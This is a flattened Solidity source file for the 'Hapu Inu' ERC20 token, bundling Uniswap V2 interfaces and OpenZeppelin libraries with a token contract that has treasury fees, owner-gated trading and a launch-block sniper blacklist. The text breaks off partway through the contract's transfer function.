1 // File: @uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router01.sol
2 
3 /*
4 
5 Hapu Inu ($Hapu)
6 
7 Website = https://hapuinu.com
8 Telegram = https://t.me/hapuinu
9 Twitter = https://twitter.com/hapuinu
10 Disclaimer do not buy research first They may fight alongside us but not for us 
11 Partners of today could be your rivals tomorrow And your rivals today could be your allies tomorrow Lets all unite 
12 
13 */
14 
15 pragma solidity >=0.6.2;
16 
17 interface IUniswapV2Router01 {
18     function factory() external pure returns (address);
19     function WETH() external pure returns (address);
20 
21     function addLiquidity(
22         address tokenA,
23         address tokenB,
24         uint amountADesired,
25         uint amountBDesired,
26         uint amountAMin,
27         uint amountBMin,
28         address to,
29         uint deadline
30     ) external returns (uint amountA, uint amountB, uint liquidity);
31     function addLiquidityETH(
32         address token,
33         uint amountTokenDesired,
34         uint amountTokenMin,
35         uint amountETHMin,
36         address to,
37         uint deadline
38     ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
39     function removeLiquidity(
40         address tokenA,
41         address tokenB,
42         uint liquidity,
43         uint amountAMin,
44         uint amountBMin,
45         address to,
46         uint deadline
47     ) external returns (uint amountA, uint amountB);
48     function removeLiquidityETH(
49         address token,
50         uint liquidity,
51         uint amountTokenMin,
52         uint amountETHMin,
53         address to,
54         uint deadline
55     ) external returns (uint amountToken, uint amountETH);
56     function removeLiquidityWithPermit(
57         address tokenA,
58         address tokenB,
59         uint liquidity,
60         uint amountAMin,
61         uint amountBMin,
62         address to,
63         uint deadline,
64         bool approveMax, uint8 v, bytes32 r, bytes32 s
65     ) external returns (uint amountA, uint amountB);
66     function removeLiquidityETHWithPermit(
67         address token,
68         uint liquidity,
69         uint amountTokenMin,
70         uint amountETHMin,
71         address to,
72         uint deadline,
73         bool approveMax, uint8 v, bytes32 r, bytes32 s
74     ) external returns (uint amountToken, uint amountETH);
75     function swapExactTokensForTokens(
76         uint amountIn,
77         uint amountOutMin,
78         address[] calldata path,
79         address to,
80         uint deadline
81     ) external returns (uint[] memory amounts);
82     function swapTokensForExactTokens(
83         uint amountOut,
84         uint amountInMax,
85         address[] calldata path,
86         address to,
87         uint deadline
88     ) external returns (uint[] memory amounts);
89     function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
90         external
91         payable
92         returns (uint[] memory amounts);
93     function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
94         external
95         returns (uint[] memory amounts);
96     function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
97         external
98         returns (uint[] memory amounts);
99     function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
100         external
101         payable
102         returns (uint[] memory amounts);
103 
104     function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
105     function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
106     function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
107     function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
108     function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
109 }
110 
111 // File: @uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol
112 
113 pragma solidity >=0.6.2;
114 
115 
116 interface IUniswapV2Router02 is IUniswapV2Router01 {
117     function removeLiquidityETHSupportingFeeOnTransferTokens(
118         address token,
119         uint liquidity,
120         uint amountTokenMin,
121         uint amountETHMin,
122         address to,
123         uint deadline
124     ) external returns (uint amountETH);
125     function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
126         address token,
127         uint liquidity,
128         uint amountTokenMin,
129         uint amountETHMin,
130         address to,
131         uint deadline,
132         bool approveMax, uint8 v, bytes32 r, bytes32 s
133     ) external returns (uint amountETH);
134 
135     function swapExactTokensForTokensSupportingFeeOnTransferTokens(
136         uint amountIn,
137         uint amountOutMin,
138         address[] calldata path,
139         address to,
140         uint deadline
141     ) external;
142     function swapExactETHForTokensSupportingFeeOnTransferTokens(
143         uint amountOutMin,
144         address[] calldata path,
145         address to,
146         uint deadline
147     ) external payable;
148     function swapExactTokensForETHSupportingFeeOnTransferTokens(
149         uint amountIn,
150         uint amountOutMin,
151         address[] calldata path,
152         address to,
153         uint deadline
154     ) external;
155 }
156 
157 // File: @uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol
158 
159 pragma solidity >=0.5.0;
160 
161 interface IUniswapV2Pair {
162     event Approval(address indexed owner, address indexed spender, uint value);
163     event Transfer(address indexed from, address indexed to, uint value);
164 
165     function name() external pure returns (string memory);
166     function symbol() external pure returns (string memory);
167     function decimals() external pure returns (uint8);
168     function totalSupply() external view returns (uint);
169     function balanceOf(address owner) external view returns (uint);
170     function allowance(address owner, address spender) external view returns (uint);
171 
172     function approve(address spender, uint value) external returns (bool);
173     function transfer(address to, uint value) external returns (bool);
174     function transferFrom(address from, address to, uint value) external returns (bool);
175 
176     function DOMAIN_SEPARATOR() external view returns (bytes32);
177     function PERMIT_TYPEHASH() external pure returns (bytes32);
178     function nonces(address owner) external view returns (uint);
179 
180     function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
181 
182     event Mint(address indexed sender, uint amount0, uint amount1);
183     event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
184     event Swap(
185         address indexed sender,
186         uint amount0In,
187         uint amount1In,
188         uint amount0Out,
189         uint amount1Out,
190         address indexed to
191     );
192     event Sync(uint112 reserve0, uint112 reserve1);
193 
194     function MINIMUM_LIQUIDITY() external pure returns (uint);
195     function factory() external view returns (address);
196     function token0() external view returns (address);
197     function token1() external view returns (address);
198     function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
199     function price0CumulativeLast() external view returns (uint);
200     function price1CumulativeLast() external view returns (uint);
201     function kLast() external view returns (uint);
202 
203     function mint(address to) external returns (uint liquidity);
204     function burn(address to) external returns (uint amount0, uint amount1);
205     function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
206     function skim(address to) external;
207     function sync() external;
208 
209     function initialize(address, address) external;
210 }
211 
212 // File: @uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol
213 
214 pragma solidity >=0.5.0;
215 
216 interface IUniswapV2Factory {
217     event PairCreated(address indexed token0, address indexed token1, address pair, uint);
218 
219     function feeTo() external view returns (address);
220     function feeToSetter() external view returns (address);
221 
222     function getPair(address tokenA, address tokenB) external view returns (address pair);
223     function allPairs(uint) external view returns (address pair);
224     function allPairsLength() external view returns (uint);
225 
226     function createPair(address tokenA, address tokenB) external returns (address pair);
227 
228     function setFeeTo(address) external;
229     function setFeeToSetter(address) external;
230 }
231 
232 // File: @openzeppelin/contracts/utils/Address.sol
233 
234 
235 // OpenZeppelin Contracts (last updated v4.7.0) (utils/Address.sol)
236 
237 pragma solidity ^0.8.1;
238 
239 /**
240  * @dev Collection of functions related to the address type
241  */
242 library Address {
243     /**
244      * @dev Returns true if `account` is a contract.
245      *
246      * [IMPORTANT]
247      * ====
248      * It is unsafe to assume that an address for which this function returns
249      * false is an externally-owned account (EOA) and not a contract.
250      *
251      * Among others, `isContract` will return false for the following
252      * types of addresses:
253      *
254      *  - an externally-owned account
255      *  - a contract in construction
256      *  - an address where a contract will be created
257      *  - an address where a contract lived, but was destroyed
258      * ====
259      *
260      * [IMPORTANT]
261      * ====
262      * You shouldn't rely on `isContract` to protect against flash loan attacks!
263      *
264      * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets
265      * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract
266      * constructor.
267      * ====
268      */
269     function isContract(address account) internal view returns (bool) {
270         // This method relies on extcodesize/address.code.length, which returns 0
271         // for contracts in construction, since the code is only stored at the end
272         // of the constructor execution.
273 
274         return account.code.length > 0;
275     }
276 
277     /**
278      * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
279      * `recipient`, forwarding all available gas and reverting on errors.
280      *
281      * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
282      * of certain opcodes, possibly making contracts go over the 2300 gas limit
283      * imposed by `transfer`, making them unable to receive funds via
284      * `transfer`. {sendValue} removes this limitation.
285      *
286      * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
287      *
288      * IMPORTANT: because control is transferred to `recipient`, care must be
289      * taken to not create reentrancy vulnerabilities. Consider using
290      * {ReentrancyGuard} or the
291      * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
292      */
293     function sendValue(address payable recipient, uint256 amount) internal {
294         require(address(this).balance >= amount, "Address: insufficient balance");
295 
296         (bool success, ) = recipient.call{value: amount}("");
297         require(success, "Address: unable to send value, recipient may have reverted");
298     }
299 
300     /**
301      * @dev Performs a Solidity function call using a low level `call`. A
302      * plain `call` is an unsafe replacement for a function call: use this
303      * function instead.
304      *
305      * If `target` reverts with a revert reason, it is bubbled up by this
306      * function (like regular Solidity function calls).
307      *
308      * Returns the raw returned data. To convert to the expected return value,
309      * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
310      *
311      * Requirements:
312      *
313      * - `target` must be a contract.
314      * - calling `target` with `data` must not revert.
315      *
316      * _Available since v3.1._
317      */
318     function functionCall(address target, bytes memory data) internal returns (bytes memory) {
319         return functionCall(target, data, "Address: low-level call failed");
320     }
321 
322     /**
323      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
324      * `errorMessage` as a fallback revert reason when `target` reverts.
325      *
326      * _Available since v3.1._
327      */
328     function functionCall(
329         address target,
330         bytes memory data,
331         string memory errorMessage
332     ) internal returns (bytes memory) {
333         return functionCallWithValue(target, data, 0, errorMessage);
334     }
335 
336     /**
337      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
338      * but also transferring `value` wei to `target`.
339      *
340      * Requirements:
341      *
342      * - the calling contract must have an ETH balance of at least `value`.
343      * - the called Solidity function must be `payable`.
344      *
345      * _Available since v3.1._
346      */
347     function functionCallWithValue(
348         address target,
349         bytes memory data,
350         uint256 value
351     ) internal returns (bytes memory) {
352         return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
353     }
354 
355     /**
356      * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
357      * with `errorMessage` as a fallback revert reason when `target` reverts.
358      *
359      * _Available since v3.1._
360      */
361     function functionCallWithValue(
362         address target,
363         bytes memory data,
364         uint256 value,
365         string memory errorMessage
366     ) internal returns (bytes memory) {
367         require(address(this).balance >= value, "Address: insufficient balance for call");
368         require(isContract(target), "Address: call to non-contract");
369 
370         (bool success, bytes memory returndata) = target.call{value: value}(data);
371         return verifyCallResult(success, returndata, errorMessage);
372     }
373 
374     /**
375      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
376      * but performing a static call.
377      *
378      * _Available since v3.3._
379      */
380     function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
381         return functionStaticCall(target, data, "Address: low-level static call failed");
382     }
383 
384     /**
385      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
386      * but performing a static call.
387      *
388      * _Available since v3.3._
389      */
390     function functionStaticCall(
391         address target,
392         bytes memory data,
393         string memory errorMessage
394     ) internal view returns (bytes memory) {
395         require(isContract(target), "Address: static call to non-contract");
396 
397         (bool success, bytes memory returndata) = target.staticcall(data);
398         return verifyCallResult(success, returndata, errorMessage);
399     }
400 
401     /**
402      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
403      * but performing a delegate call.
404      *
405      * _Available since v3.4._
406      */
407     function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
408         return functionDelegateCall(target, data, "Address: low-level delegate call failed");
409     }
410 
411     /**
412      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
413      * but performing a delegate call.
414      *
415      * _Available since v3.4._
416      */
417     function functionDelegateCall(
418         address target,
419         bytes memory data,
420         string memory errorMessage
421     ) internal returns (bytes memory) {
422         require(isContract(target), "Address: delegate call to non-contract");
423 
424         (bool success, bytes memory returndata) = target.delegatecall(data);
425         return verifyCallResult(success, returndata, errorMessage);
426     }
427 
428     /**
429      * @dev Tool to verifies that a low level call was successful, and revert if it wasn't, either by bubbling the
430      * revert reason using the provided one.
431      *
432      * _Available since v4.3._
433      */
434     function verifyCallResult(
435         bool success,
436         bytes memory returndata,
437         string memory errorMessage
438     ) internal pure returns (bytes memory) {
439         if (success) {
440             return returndata;
441         } else {
442             // Look for revert reason and bubble it up if present
443             if (returndata.length > 0) {
444                 // The easiest way to bubble the revert reason is using memory via assembly
445                 /// @solidity memory-safe-assembly
446                 assembly {
447                     let returndata_size := mload(returndata)
448                     revert(add(32, returndata), returndata_size)
449                 }
450             } else {
451                 revert(errorMessage);
452             }
453         }
454     }
455 }
456 
457 // File: @openzeppelin/contracts/utils/Context.sol
458 
459 
460 // OpenZeppelin Contracts v4.4.1 (utils/Context.sol)
461 
462 pragma solidity ^0.8.0;
463 
464 /**
465  * @dev Provides information about the current execution context, including the
466  * sender of the transaction and its data. While these are generally available
467  * via msg.sender and msg.data, they should not be accessed in such a direct
468  * manner, since when dealing with meta-transactions the account sending and
469  * paying for execution may not be the actual sender (as far as an application
470  * is concerned).
471  *
472  * This contract is only required for intermediate, library-like contracts.
473  */
474 abstract contract Context {
475     function _msgSender() internal view virtual returns (address) {
476         return msg.sender;
477     }
478 
479     function _msgData() internal view virtual returns (bytes calldata) {
480         return msg.data;
481     }
482 }
483 
484 // File: @openzeppelin/contracts/access/Ownable.sol
485 
486 
487 // OpenZeppelin Contracts (last updated v4.7.0) (access/Ownable.sol)
488 
489 pragma solidity ^0.8.0;
490 
491 
492 /**
493  * @dev Contract module which provides a basic access control mechanism, where
494  * there is an account (an owner) that can be granted exclusive access to
495  * specific functions.
496  *
497  * By default, the owner account will be the one that deploys the contract. This
498  * can later be changed with {transferOwnership}.
499  *
500  * This module is used through inheritance. It will make available the modifier
501  * `onlyOwner`, which can be applied to your functions to restrict their use to
502  * the owner.
503  */
504 abstract contract Ownable is Context {
505     address private _owner;
506 
507     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
508 
509     /**
510      * @dev Initializes the contract setting the deployer as the initial owner.
511      */
512     constructor() {
513         _transferOwnership(_msgSender());
514     }
515 
516     /**
517      * @dev Throws if called by any account other than the owner.
518      */
519     modifier onlyOwner() {
520         _checkOwner();
521         _;
522     }
523 
524     /**
525      * @dev Returns the address of the current owner.
526      */
527     function owner() public view virtual returns (address) {
528         return _owner;
529     }
530 
531     /**
532      * @dev Throws if the sender is not the owner.
533      */
534     function _checkOwner() internal view virtual {
535         require(owner() == _msgSender(), "Ownable: caller is not the owner");
536     }
537 
538     /**
539      * @dev Leaves the contract without owner. It will not be possible to call
540      * `onlyOwner` functions anymore. Can only be called by the current owner.
541      *
542      * NOTE: Renouncing ownership will leave the contract without an owner,
543      * thereby removing any functionality that is only available to the owner.
544      */
545     function renounceOwnership() public virtual onlyOwner {
546         _transferOwnership(address(0));
547     }
548 
549     /**
550      * @dev Transfers ownership of the contract to a new account (`newOwner`).
551      * Can only be called by the current owner.
552      */
553     function transferOwnership(address newOwner) public virtual onlyOwner {
554         require(newOwner != address(0), "Ownable: new owner is the zero address");
555         _transferOwnership(newOwner);
556     }
557 
558     /**
559      * @dev Transfers ownership of the contract to a new account (`newOwner`).
560      * Internal function without access restriction.
561      */
562     function _transferOwnership(address newOwner) internal virtual {
563         address oldOwner = _owner;
564         _owner = newOwner;
565         emit OwnershipTransferred(oldOwner, newOwner);
566     }
567 }
568 
569 // File: @openzeppelin/contracts/utils/math/SafeMath.sol
570 
571 
572 // OpenZeppelin Contracts (last updated v4.6.0) (utils/math/SafeMath.sol)
573 
574 pragma solidity ^0.8.0;
575 
576 // CAUTION
577 // This version of SafeMath should only be used with Solidity 0.8 or later,
578 // because it relies on the compiler's built in overflow checks.
579 
580 /**
581  * @dev Wrappers over Solidity's arithmetic operations.
582  *
583  * NOTE: `SafeMath` is generally not needed starting with Solidity 0.8, since the compiler
584  * now has built in overflow checking.
585  */
586 library SafeMath {
587     /**
588      * @dev Returns the addition of two unsigned integers, with an overflow flag.
589      *
590      * _Available since v3.4._
591      */
592     function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
593         unchecked {
594             uint256 c = a + b;
595             if (c < a) return (false, 0);
596             return (true, c);
597         }
598     }
599 
600     /**
601      * @dev Returns the subtraction of two unsigned integers, with an overflow flag.
602      *
603      * _Available since v3.4._
604      */
605     function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
606         unchecked {
607             if (b > a) return (false, 0);
608             return (true, a - b);
609         }
610     }
611 
612     /**
613      * @dev Returns the multiplication of two unsigned integers, with an overflow flag.
614      *
615      * _Available since v3.4._
616      */
617     function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
618         unchecked {
619             // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
620             // benefit is lost if 'b' is also tested.
621             // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
622             if (a == 0) return (true, 0);
623             uint256 c = a * b;
624             if (c / a != b) return (false, 0);
625             return (true, c);
626         }
627     }
628 
629     /**
630      * @dev Returns the division of two unsigned integers, with a division by zero flag.
631      *
632      * _Available since v3.4._
633      */
634     function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
635         unchecked {
636             if (b == 0) return (false, 0);
637             return (true, a / b);
638         }
639     }
640 
641     /**
642      * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
643      *
644      * _Available since v3.4._
645      */
646     function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
647         unchecked {
648             if (b == 0) return (false, 0);
649             return (true, a % b);
650         }
651     }
652 
653     /**
654      * @dev Returns the addition of two unsigned integers, reverting on
655      * overflow.
656      *
657      * Counterpart to Solidity's `+` operator.
658      *
659      * Requirements:
660      *
661      * - Addition cannot overflow.
662      */
663     function add(uint256 a, uint256 b) internal pure returns (uint256) {
664         return a + b;
665     }
666 
667     /**
668      * @dev Returns the subtraction of two unsigned integers, reverting on
669      * overflow (when the result is negative).
670      *
671      * Counterpart to Solidity's `-` operator.
672      *
673      * Requirements:
674      *
675      * - Subtraction cannot overflow.
676      */
677     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
678         return a - b;
679     }
680 
681     /**
682      * @dev Returns the multiplication of two unsigned integers, reverting on
683      * overflow.
684      *
685      * Counterpart to Solidity's `*` operator.
686      *
687      * Requirements:
688      *
689      * - Multiplication cannot overflow.
690      */
691     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
692         return a * b;
693     }
694 
695     /**
696      * @dev Returns the integer division of two unsigned integers, reverting on
697      * division by zero. The result is rounded towards zero.
698      *
699      * Counterpart to Solidity's `/` operator.
700      *
701      * Requirements:
702      *
703      * - The divisor cannot be zero.
704      */
705     function div(uint256 a, uint256 b) internal pure returns (uint256) {
706         return a / b;
707     }
708 
709     /**
710      * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
711      * reverting when dividing by zero.
712      *
713      * Counterpart to Solidity's `%` operator. This function uses a `revert`
714      * opcode (which leaves remaining gas untouched) while Solidity uses an
715      * invalid opcode to revert (consuming all remaining gas).
716      *
717      * Requirements:
718      *
719      * - The divisor cannot be zero.
720      */
721     function mod(uint256 a, uint256 b) internal pure returns (uint256) {
722         return a % b;
723     }
724 
725     /**
726      * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
727      * overflow (when the result is negative).
728      *
729      * CAUTION: This function is deprecated because it requires allocating memory for the error
730      * message unnecessarily. For custom revert reasons use {trySub}.
731      *
732      * Counterpart to Solidity's `-` operator.
733      *
734      * Requirements:
735      *
736      * - Subtraction cannot overflow.
737      */
738     function sub(
739         uint256 a,
740         uint256 b,
741         string memory errorMessage
742     ) internal pure returns (uint256) {
743         unchecked {
744             require(b <= a, errorMessage);
745             return a - b;
746         }
747     }
748 
749     /**
750      * @dev Returns the integer division of two unsigned integers, reverting with custom message on
751      * division by zero. The result is rounded towards zero.
752      *
753      * Counterpart to Solidity's `/` operator. Note: this function uses a
754      * `revert` opcode (which leaves remaining gas untouched) while Solidity
755      * uses an invalid opcode to revert (consuming all remaining gas).
756      *
757      * Requirements:
758      *
759      * - The divisor cannot be zero.
760      */
761     function div(
762         uint256 a,
763         uint256 b,
764         string memory errorMessage
765     ) internal pure returns (uint256) {
766         unchecked {
767             require(b > 0, errorMessage);
768             return a / b;
769         }
770     }
771 
772     /**
773      * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
774      * reverting with custom message when dividing by zero.
775      *
776      * CAUTION: This function is deprecated because it requires allocating memory for the error
777      * message unnecessarily. For custom revert reasons use {tryMod}.
778      *
779      * Counterpart to Solidity's `%` operator. This function uses a `revert`
780      * opcode (which leaves remaining gas untouched) while Solidity uses an
781      * invalid opcode to revert (consuming all remaining gas).
782      *
783      * Requirements:
784      *
785      * - The divisor cannot be zero.
786      */
787     function mod(
788         uint256 a,
789         uint256 b,
790         string memory errorMessage
791     ) internal pure returns (uint256) {
792         unchecked {
793             require(b > 0, errorMessage);
794             return a % b;
795         }
796     }
797 }
798 
799 // File: @openzeppelin/contracts/token/ERC20/IERC20.sol
800 
801 
802 // OpenZeppelin Contracts (last updated v4.6.0) (token/ERC20/IERC20.sol)
803 
804 pragma solidity ^0.8.0;
805 
806 /**
807  * @dev Interface of the ERC20 standard as defined in the EIP.
808  */
809 interface IERC20 {
810     /**
811      * @dev Emitted when `value` tokens are moved from one account (`from`) to
812      * another (`to`).
813      *
814      * Note that `value` may be zero.
815      */
816     event Transfer(address indexed from, address indexed to, uint256 value);
817 
818     /**
819      * @dev Emitted when the allowance of a `spender` for an `owner` is set by
820      * a call to {approve}. `value` is the new allowance.
821      */
822     event Approval(address indexed owner, address indexed spender, uint256 value);
823 
824     /**
825      * @dev Returns the amount of tokens in existence.
826      */
827     function totalSupply() external view returns (uint256);
828 
829     /**
830      * @dev Returns the amount of tokens owned by `account`.
831      */
832     function balanceOf(address account) external view returns (uint256);
833 
834     /**
835      * @dev Moves `amount` tokens from the caller's account to `to`.
836      *
837      * Returns a boolean value indicating whether the operation succeeded.
838      *
839      * Emits a {Transfer} event.
840      */
841     function transfer(address to, uint256 amount) external returns (bool);
842 
843     /**
844      * @dev Returns the remaining number of tokens that `spender` will be
845      * allowed to spend on behalf of `owner` through {transferFrom}. This is
846      * zero by default.
847      *
848      * This value changes when {approve} or {transferFrom} are called.
849      */
850     function allowance(address owner, address spender) external view returns (uint256);
851 
852     /**
853      * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
854      *
855      * Returns a boolean value indicating whether the operation succeeded.
856      *
857      * IMPORTANT: Beware that changing an allowance with this method brings the risk
858      * that someone may use both the old and the new allowance by unfortunate
859      * transaction ordering. One possible solution to mitigate this race
860      * condition is to first reduce the spender's allowance to 0 and set the
861      * desired value afterwards:
862      * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
863      *
864      * Emits an {Approval} event.
865      */
866     function approve(address spender, uint256 amount) external returns (bool);
867 
868     /**
869      * @dev Moves `amount` tokens from `from` to `to` using the
870      * allowance mechanism. `amount` is then deducted from the caller's
871      * allowance.
872      *
873      * Returns a boolean value indicating whether the operation succeeded.
874      *
875      * Emits a {Transfer} event.
876      */
877     function transferFrom(
878         address from,
879         address to,
880         uint256 amount
881     ) external returns (bool);
882 }
883 
884 // File: contracts/haputokenverified.sol
885 
886 
887 pragma solidity ^0.8.4;
888 
889 
890 
891 
892 
893 
894 
895 
896 contract HapuToken is Context, IERC20, Ownable {
897     using SafeMath for uint256;
898     using Address for address;
899 
900     address payable public treasuryWallet =
901         payable(0x505184CFBf416016e4EF0d2291C5097a48722fF0);
902     address public constant deadAddress =
903         0x000000000000000000000000000000000000dEaD;
904 
905     mapping(address => uint256) private _tOwned;
906     mapping(address => mapping(address => uint256)) private _allowances;
907     mapping(address => bool) private _isSniper;
908     address[] private _confirmedSnipers;
909 
910     mapping(address => bool) private _isExcludedFee;
911 
912     string private constant _name = "Hapu Inu";
913     string private constant _symbol = "HAPU";
914     uint8 private constant _decimals = 9;
915 
916     uint256 private constant MAX = ~uint256(0);
917     uint256 private constant _tTotal = 738738738369000 * 10**_decimals;
918 
919     uint256 public treasuryFeeOnBuy = 6;
920     uint256 public treasuryFeeOnSell = 9;
921 
922     IUniswapV2Router02 public uniswapV2Router;
923     address public uniswapV2Pair;
924 
925     // PancakeSwap: 0x10ED43C718714eb63d5aA57B78B54704E256024E
926     // Uniswap V2: 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
927     address private constant _uniswapRouterAddress =
928         0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
929 
930     bool private _inSwapAndLiquify;
931 
932     uint256 public launchTime;
933     bool private _tradingOpen = false;
934     bool private _transferOpen = false;
935 
936     uint256 public maxWallet = _tTotal.div(100);
937     uint256 public swapAtAmount = _tTotal.div(1000);
938     bool public swapAndTreasureEnabled = true;
939 
940     event SendETHRewards(address to, uint256 amountETH);
941     event SendTokenRewards(address to, address token, uint256 amount);
942     event SwapETHForTokens(address whereTo, uint256 amountIn, address[] path);
943     event SwapTokensForETH(uint256 amountIn, address[] path);
944     event SwapAndLiquify(
945         uint256 tokensSwappedForEth,
946         uint256 ethAddedForLp,
947         uint256 tokensAddedForLp
948     );
949 
950     modifier lockTheSwap() {
951         _inSwapAndLiquify = true;
952         _;
953         _inSwapAndLiquify = false;
954     }
955 
956     constructor() {
957         _tOwned[_msgSender()] = _tTotal;
958         emit Transfer(address(0), _msgSender(), _tTotal);
959     }
960 
961     function initContract() external onlyOwner {
962         IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(
963             _uniswapRouterAddress
964         );
965         uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
966             .createPair(address(this), _uniswapV2Router.WETH());
967 
968         uniswapV2Router = _uniswapV2Router;
969 
970         _isExcludedFee[owner()] = true;
971         _isExcludedFee[address(this)] = true;
972     }
973 
974     function openTrading() external onlyOwner {
975         _tradingOpen = true;
976         _transferOpen = true;
977         launchTime = block.timestamp;
978     }
979 
980     function name() external pure returns (string memory) {
981         return _name;
982     }
983 
984     function symbol() external pure returns (string memory) {
985         return _symbol;
986     }
987 
988     function decimals() external pure returns (uint8) {
989         return _decimals;
990     }
991 
992     function totalSupply() external pure override returns (uint256) {
993         return _tTotal;
994     }
995 
996     function balanceOf(address account) public view override returns (uint256) {
997         return _tOwned[account];
998     }
999 
1000     function transfer(address recipient, uint256 amount)
1001         external
1002         override
1003         returns (bool)
1004     {
1005         _transfer(_msgSender(), recipient, amount);
1006         return true;
1007     }
1008 
1009     function allowance(address owner, address spender)
1010         external
1011         view
1012         override
1013         returns (uint256)
1014     {
1015         return _allowances[owner][spender];
1016     }
1017 
1018     function approve(address spender, uint256 amount)
1019         external
1020         override
1021         returns (bool)
1022     {
1023         _approve(_msgSender(), spender, amount);
1024         return true;
1025     }
1026 
1027     function transferFrom(
1028         address sender,
1029         address recipient,
1030         uint256 amount
1031     ) external override returns (bool) {
1032         _transfer(sender, recipient, amount);
1033         _approve(
1034             sender,
1035             _msgSender(),
1036             _allowances[sender][_msgSender()].sub(
1037                 amount,
1038                 "ERC20: transfer amount exceeds allowance"
1039             )
1040         );
1041         return true;
1042     }
1043 
1044     function increaseAllowance(address spender, uint256 addedValue)
1045         external
1046         virtual
1047         returns (bool)
1048     {
1049         _approve(
1050             _msgSender(),
1051             spender,
1052             _allowances[_msgSender()][spender].add(addedValue)
1053         );
1054         return true;
1055     }
1056 
1057     function decreaseAllowance(address spender, uint256 subtractedValue)
1058         external
1059         virtual
1060         returns (bool)
1061     {
1062         _approve(
1063             _msgSender(),
1064             spender,
1065             _allowances[_msgSender()][spender].sub(
1066                 subtractedValue,
1067                 "ERC20: decreased allowance below zero"
1068             )
1069         );
1070         return true;
1071     }
1072 
1073     function _approve(
1074         address owner,
1075         address spender,
1076         uint256 amount
1077     ) private {
1078         require(owner != address(0), "ERC20: approve from the zero address");
1079         require(spender != address(0), "ERC20: approve to the zero address");
1080 
1081         _allowances[owner][spender] = amount;
1082         emit Approval(owner, spender, amount);
1083     }
1084 
1085     function _transfer(
1086         address from,
1087         address to,
1088         uint256 amount
1089     ) private {
1090         require(from != address(0), "ERC20: transfer from the zero address");
1091         require(to != address(0), "ERC20: transfer to the zero address");
1092         require(amount > 0, "Transfer amount must be greater than zero");
1093         require(!_isSniper[to], "Stop sniping!");
1094         require(!_isSniper[from], "Stop sniping!");
1095         require(!_isSniper[_msgSender()], "Stop sniping!");
1096         require(
1097             _transferOpen || from == owner(),
1098             "transferring tokens is not currently allowed"
1099         );
1100         if ((from == uniswapV2Pair || to == uniswapV2Pair) && from != owner()) {
1101             require(_tradingOpen, "Trading not yet enabled.");
1102         }
1103         if (block.timestamp == launchTime && from == uniswapV2Pair) {
1104             _isSniper[to] = true;
1105             _confirmedSnipers.push(to);
1106         }
1107 
1108         if (
1109             balanceOf(address(this)) >= swapAtAmount &&
1110             !_inSwapAndLiquify &&
1111             from != uniswapV2Pair &&
1112             swapAndTreasureEnabled
1113         ) {
1114             swapAndSendTreasure(swapAtAmount);
1115         }
1116 
1117         if (isExcludedFromFee(from) || isExcludedFromFee(to)) {
1118             _basicTransfer(from, to, amount);
1119         } else {
1120             if (to == uniswapV2Pair) {
1121                 _transferStandard(from, to, amount, treasuryFeeOnSell);
1122             } else {
